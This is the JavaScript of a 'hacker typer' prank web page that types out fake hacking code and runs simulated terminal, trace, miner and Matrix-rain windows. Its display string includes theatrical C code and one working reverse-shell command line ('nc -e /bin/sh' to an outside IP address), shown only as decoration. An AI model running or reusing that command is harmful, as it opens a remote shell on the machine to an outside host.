// Hacker Typer Simulator - geekprank-style
const codeSource = `#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <openssl/aes.h>

#define SERVER_PORT 443
#define BUFFER_SIZE 4096
#define MAX_CONNECTIONS 1024

typedef struct {
    char ip[16];
    int port;
    int status;
    unsigned char key[32];
} connection_t;

static connection_t connections[MAX_CONNECTIONS];
static int conn_count = 0;

void init_encryption(unsigned char *key) {
    AES_KEY enc_key;
    AES_set_encrypt_key(key, 256, &enc_key);
    printf("[*] AES-256 encryption initialized\\n");
}

int establish_connection(const char *target_ip, int port) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket");
        return -1;
    }
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, target_ip, &addr.sin_addr);

    printf("[*] Connecting to %s:%d...\\n", target_ip, port);
    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        printf("[!] Connection failed\\n");
        return -1;
    }
    printf("[+] Connection established\\n");
    return sockfd;
}

void bypass_firewall(int sockfd) {
    char payload[BUFFER_SIZE];
    memset(payload, 0x90, sizeof(payload)); // NOP sled
    printf("[*] Injecting payload...\\n");
    send(sockfd, payload, sizeof(payload), 0);
    printf("[+] Firewall bypassed\\n");
}

void escalate_privileges(int sockfd) {
    const char *exploit = "sudo -u root /bin/sh\\x00";
    send(sockfd, exploit, strlen(exploit), 0);
    printf("[*] Escalating privileges...\\n");
    usleep(500000);
    printf("[+] Root access granted\\n");
}

void dump_database(int sockfd) {
    printf("[*] Accessing mainframe database...\\n");
    printf("[*] Downloading user records...\\n");
    for (int i = 0; i < 100; i += 10) {
        printf("\\r[*] Progress: %d%%", i);
        fflush(stdout);
        usleep(100000);
    }
    printf("\\r[+] Progress: 100%%\\n");
    printf("[+] 14,582 records extracted\\n");
}

void trace_route(const char *host) {
    printf("traceroute to %s\\n", host);
    printf(" 1  192.168.1.1    1.2 ms\\n");
    printf(" 2  10.0.0.1       8.4 ms\\n");
    printf(" 3  172.16.4.22   14.1 ms\\n");
    printf(" 4  23.86.111.0   22.7 ms\\n");
    printf("[+] Target located\\n");
}

int main(int argc, char *argv[]) {
    printf("=== SECURE ACCESS TERMINAL v3.2 ===\\n");
    unsigned char key[32] = {0};
    init_encryption(key);

    int sock = establish_connection("23.86.111.0", SERVER_PORT);
    if (sock < 0) return 1;

    bypass_firewall(sock);
    escalate_privileges(sock);
    trace_route("23.86.111.0");
    dump_database(sock);

    printf("[+] Operation complete.\\n");
    close(sock);
    return 0;
}
// injecting kernel module...
// [OK] module loaded: rootkit.ko
// [OK] hiding processes: sshd, httpd, mysqld
// [OK] intercepting syscalls: read, write, open
// [WARN] IDS detected - deploying countermeasures
// [OK] IDS evaded
// establishing reverse shell...
// nc -e /bin/sh 23.86.111.0 4444
// [+] shell spawned (uid=0 root)
// downloading payload: stage2.bin
// decrypting with RSA-4096...
// [##########----------] 52%
// [####################] 100%
// [+] payload deployed
`;

let codeIndex = 0;
let automate = false;
let automateTimer = null;
let zTop = 10;

const codeOutput = document.getElementById("codeOutput");
const hint = document.querySelector(".hint");

function appendCode(chars = 3) {
    if (!codeOutput) return;
    if (codeIndex === 0) hint && hint.classList.add("hidden");
    const slice = codeSource.slice(codeIndex, codeIndex + chars);
    codeOutput.textContent += slice || "";
    codeIndex += chars;
    if (codeIndex >= codeSource.length) codeIndex = 0;
    const container = codeOutput.parentElement;
    container.scrollTop = container.scrollHeight;
}

function setAutomate(on) {
    automate = on;
    const btn = document.getElementById("autoBtn");
    if (on) {
        btn.classList.add("active");
        btn.textContent = "⏸ Automate";
        automateTimer = setInterval(() => appendCode(4), 30);
    } else {
        btn.classList.remove("active");
        btn.textContent = "▶ Automate";
        clearInterval(automateTimer);
        automateTimer = null;
    }
}

// Windows
function bringToFront(win) {
    zTop += 1;
    win.style.zIndex = zTop;
}

function openWindow(name) {
    const win = document.getElementById(`win-${name}`);
    if (!win) return;
    win.classList.remove("hidden");
    bringToFront(win);
    if (name === "terminal") document.getElementById("termInput").focus();
    if (name === "matrix") startMatrix();
}

function closeWindow(name) {
    const win = document.getElementById(`win-${name}`);
    if (!win) return;
    win.classList.add("hidden");
    if (name === "matrix") stopMatrix();
    if (name === "bitcoin") stopMining();
    if (name === "trace") stopTrace();
}

function toggleWindow(name) {
    const win = document.getElementById(`win-${name}`);
    if (!win) return;
    if (win.classList.contains("hidden")) openWindow(name);
    else closeWindow(name);
}

document.querySelectorAll(".icon").forEach((btn) => {
    btn.addEventListener("click", () => openWindow(btn.dataset.window));
});
document.querySelectorAll("[data-close]").forEach((btn) => {
    btn.addEventListener("click", () => closeWindow(btn.dataset.close));
});
document.querySelectorAll(".window").forEach((win) => {
    win.addEventListener("mousedown", () => bringToFront(win));
});

// Drag windows
document.querySelectorAll(".titlebar").forEach((bar) => {
    let dragging = false, ox = 0, oy = 0;
    const win = bar.parentElement;
    bar.addEventListener("mousedown", (e) => {
        if (e.target.closest("button")) return;
        dragging = true;
        ox = e.clientX - win.offsetLeft;
        oy = e.clientY - win.offsetTop;
        bringToFront(win);
        e.preventDefault();
    });
    window.addEventListener("mousemove", (e) => {
        if (!dragging) return;
        const parent = document.getElementById("windows");
        let x = e.clientX - ox;
        let y = e.clientY - oy;
        x = Math.max(0, Math.min(x, parent.clientWidth - 80));
        y = Math.max(0, Math.min(y, parent.clientHeight - 40));
        win.style.left = x + "px";
        win.style.top = y + "px";
    });
    window.addEventListener("mouseup", () => { dragging = false; });
});

// Fullscreen & automate
document.getElementById("fullscreenBtn").addEventListener("click", () => {
    if (!document.fullscreenElement) document.documentElement.requestFullscreen().catch(() => { });
    else document.exitFullscreen().catch(() => { });
});
document.getElementById("autoBtn").addEventListener("click", () => setAutomate(!automate));

// Keyboard: numbers open windows, typing feeds typer
const keyMap = { "1": "typer", "2": "terminal", "3": "access", "4": "trace", "5": "bitcoin", "6": "matrix" };
document.addEventListener("keydown", (e) => {
    if (e.target === document.getElementById("termInput")) return;
    if (keyMap[e.key]) { toggleWindow(keyMap[e.key]); return; }
    if (e.key === "Escape") {
        document.querySelectorAll(".window:not(.hidden)").forEach((w) => w.classList.add("hidden"));
        stopMatrix(); stopMining(); stopTrace();
        return;
    }
    if (e.ctrlKey || e.metaKey || e.altKey) return;
    if (e.key.length === 1 || e.key === "Enter" || e.key === "Backspace" || e.key === "Tab") {
        const typerWin = document.getElementById("win-typer");
        if (typerWin && typerWin.classList.contains("hidden")) openWindow("typer");
        appendCode(e.key === "Enter" ? 8 : e.key === "Tab" ? 6 : 4);
    }
});

// Terminal window
const termOutput = document.getElementById("termOutput");
const termInput = document.getElementById("termInput");
const termBody = document.getElementById("termBody");
function termPrint(text, cls = "") {
    const div = document.createElement("div");
    div.textContent = text;
    if (cls) div.className = cls;
    termOutput.appendChild(div);
    termBody.scrollTop = termBody.scrollHeight;
}
termInput.addEventListener("keydown", (e) => {
    if (e.key !== "Enter") return;
    const cmd = termInput.value.trim();
    termInput.value = "";
    termPrint(`root@server:~$ ${cmd}`);
    if (!cmd) return;
    const [c, ...args] = cmd.split(/\s+/);
    switch (c.toLowerCase()) {
        case "help":
            termPrint("Commands: help, clear, whoami, ls, pwd, ip, nmap, hack, exit", "line-sys");
            break;
        case "clear": termOutput.innerHTML = ""; break;
        case "whoami": termPrint("root"); break;
        case "pwd": termPrint("/root"); break;
        case "ls": termPrint("passwords.txt  payload.bin  config.cfg  database.sql"); break;
        case "ip": termPrint("23.86.111.0", "line-sys"); break;
        case "nmap":
            termPrint("Scanning 23.86.111.0...", "line-sys");
            setTimeout(() => termPrint("22/tcp open ssh\n80/tcp open http\n443/tcp open https\n3306/tcp open mysql"), 400);
            break;
        case "hack":
            termPrint("Initiating breach sequence...", "line-sys");
            ["Bypassing firewall...", "Cracking hashes...", "Injecting payload...", "Access granted."].forEach((s, i) =>
                setTimeout(() => termPrint(s, i === 3 ? "" : "line-sys"), (i + 1) * 500));
            break;
        case "exit": closeWindow("terminal"); break;
        default: termPrint(`bash: ${c}: command not found`, "line-err");
    }
});

// Access denied/granted
const accessStatus = document.getElementById("accessStatus");
const accessMsg = document.getElementById("accessMsg");
let granted = false;
document.getElementById("toggleAccess").addEventListener("click", () => {
    granted = !granted;
    if (granted) {
        accessStatus.textContent = "ACCESS GRANTED";
        accessStatus.className = "granted";
        accessMsg.textContent = "Welcome the Great hacker";
    } else {
        accessStatus.textContent = "ACCESS DENIED";
        accessStatus.className = "denied";
        accessMsg.textContent = "Unauthorized access attempt detected.";
    }
});

// Satellite trace
let traceTimer = null, traceProgress = 0;
const traceBar = document.getElementById("traceBar");
const traceCanvas = document.getElementById("traceCanvas");
const tctx = traceCanvas ? traceCanvas.getContext("2d") : null;
function drawTraceBg() {
    if (!tctx) return;
    tctx.fillStyle = "#000"; tctx.fillRect(0, 0, traceCanvas.width, traceCanvas.height);
    tctx.strokeStyle = "#030"; tctx.lineWidth = 1;
    for (let x = 0; x < traceCanvas.width; x += 20) { tctx.beginPath(); tctx.moveTo(x, 0); tctx.lineTo(x, traceCanvas.height); tctx.stroke(); }
    for (let y = 0; y < traceCanvas.height; y += 20) { tctx.beginPath(); tctx.moveTo(0, y); tctx.lineTo(traceCanvas.width, y); tctx.stroke(); }
}
function drawTracePoint(p) {
    if (!tctx) return;
    drawTraceBg();
    const x = 40 + p * 3.6;
    const y = 70 + Math.sin(p / 10) * 30;
    tctx.strokeStyle = "#0f0"; tctx.beginPath(); tctx.arc(220, 70, 40, 0, Math.PI * 2); tctx.stroke();
    tctx.fillStyle = "#0f0"; tctx.beginPath(); tctx.arc(x, y, 4, 0, Math.PI * 2); tctx.fill();
    tctx.strokeStyle = "#060"; tctx.beginPath(); tctx.moveTo(220, 70); tctx.lineTo(x, y); tctx.stroke();
}
function startTrace() {
    if (traceTimer) return;
    traceProgress = 0;
    document.getElementById("traceStatus").textContent = "Tracing...";
    document.getElementById("location").textContent = "Resolving...";
    traceTimer = setInterval(() => {
        traceProgress = Math.min(100, traceProgress + 2);
        traceBar.style.width = traceProgress + "%";
        document.getElementById("signal").textContent = Math.floor(40 + traceProgress * 0.6) + "%";
        drawTracePoint(traceProgress);
        if (traceProgress >= 100) {
            clearInterval(traceTimer); traceTimer = null;
            document.getElementById("traceStatus").textContent = "Locked";
            document.getElementById("location").textContent = "37.7749° N, 122.4194° W";
        }
    }, 80);
}
function stopTrace() {
    if (traceTimer) { clearInterval(traceTimer); traceTimer = null; }
    traceProgress = 0; traceBar.style.width = "0%";
    document.getElementById("traceStatus").textContent = "Standby";
    document.getElementById("signal").textContent = "--%";
    document.getElementById("location").textContent = "Unknown";
    drawTraceBg();
}
document.getElementById("startTrace").addEventListener("click", startTrace);
drawTraceBg();

// Bitcoin miner
let mineTimer = null, btc = 0, accepted = 0, rejected = 0;
const minerLog = document.getElementById("minerLog");
const mineBtn = document.getElementById("mineBtn");
function logMine(msg) {
    minerLog.textContent += msg + "\n";
    minerLog.scrollTop = minerLog.scrollHeight;
    const lines = minerLog.textContent.split("\n");
    if (lines.length > 80) minerLog.textContent = lines.slice(-60).join("\n");
}
function startMining() {
    if (mineTimer) { stopMining(); return; }
    mineBtn.textContent = "Stop Mining";
    logMine("[*] Connecting to stratum pool...");
    mineTimer = setInterval(() => {
        const hr = (Math.random() * 50 + 120).toFixed(2);
        const acc = Math.random() > 0.15;
        if (acc) { accepted++; btc += 0.000012 + Math.random() * 0.00002; }
        else { rejected++; }
        document.getElementById("hashrate").textContent = hr;
        document.getElementById("accepted").textContent = accepted;
        document.getElementById("rejected").textContent = rejected;
        document.getElementById("btcWallet").textContent = btc.toFixed(6);
        logMine(`${acc ? "[+] Accepted" : "[-] Rejected"} share | ${hr} GH/s | diff 14.7T`);
    }, 900);
}
function stopMining() {
    if (mineTimer) { clearInterval(mineTimer); mineTimer = null; }
    mineBtn.textContent = "Start Mining";
}
mineBtn.addEventListener("click", startMining);

// Matrix rain
let matrixRAF = null, matrixRunning = false;
const matrixCanvas = document.getElementById("matrixCanvas");
const mctx = matrixCanvas ? matrixCanvas.getContext("2d") : null;
function startMatrix() {
    if (matrixRunning || !matrixCanvas || !mctx) return;
    matrixRunning = true;
    const parent = matrixCanvas.parentElement;
    matrixCanvas.width = parent.clientWidth || 500;
    matrixCanvas.height = parent.clientHeight || 320;
    const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const fontSize = 14;
    const cols = Math.floor(matrixCanvas.width / fontSize);
    const drops = Array(cols).fill(1);
    function draw() {
        if (!matrixRunning) return;
        mctx.fillStyle = "rgba(0,0,0,0.08)";
        mctx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
        mctx.fillStyle = "#0f0";
        mctx.font = fontSize + "px monospace";
        for (let i = 0; i < drops.length; i++) {
            const t = chars[Math.floor(Math.random() * chars.length)];
            mctx.fillText(t, i * fontSize, drops[i] * fontSize);
            if (drops[i] * fontSize > matrixCanvas.height && Math.random() > 0.975) drops[i] = 0;
            drops[i]++;
        }
        matrixRAF = requestAnimationFrame(draw);
    }
    draw();
}
function stopMatrix() {
    matrixRunning = false;
    if (matrixRAF) cancelAnimationFrame(matrixRAF);
    matrixRAF = null;
}

// Boot: open typer
openWindow("typer");
termPrint("Welcome to root@server. Type 'help' for commands.", "line-sys");